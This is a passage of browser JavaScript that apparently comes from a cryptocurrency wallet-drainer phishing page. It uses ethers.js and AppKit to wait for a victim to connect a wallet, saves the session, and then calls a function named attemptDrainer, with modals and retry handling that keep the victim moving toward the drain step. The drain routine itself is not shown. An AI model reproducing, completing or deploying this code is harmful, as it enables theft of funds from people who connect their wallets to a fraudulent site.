      if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
      const network = await provider.getNetwork();
      await saveSession(connectedAddress, network.chainId);
    } else {
      console.log(`✅ Wallet already connected: ${connectedAddress}`);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('⏳ Transaction already in progress');
      await hideModalWithDelay("Transaction already in progress.");
    }
  } catch (error) {
    console.error(`❌ Connection error: ${error.message}`);
    appKit.close();
    isTransactionPending = false;
    showModal();
    await hideModalWithDelay(`Error: ${error.message}`);
  }
}

async function waitForConnection() {
  return new Promise((resolve, reject) => {
    console.log('📡 Waiting for wallet connection via AppKit...');

    const isMobile = isMobileDevice();
    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);

    const unsubscribe = appKit.subscribeState((state) => {
      if (state.connected && state.address) {
        console.log(`✅ Wallet connected via AppKit: ${state.address}`);
        unsubscribe();
        resolve(state.address);
      }
    });

    const timeout = setTimeout(() => {
      unsubscribe();
      reject(new Error('Timeout waiting for wallet connection'));
    }, 60000);

    appKit.open('error', (err) => {
      console.error(`❌ AppKit error: ${err.message}`);
      clearTimeout(timeout);
      unsubscribe();
      reject(err);
    });
  });
}
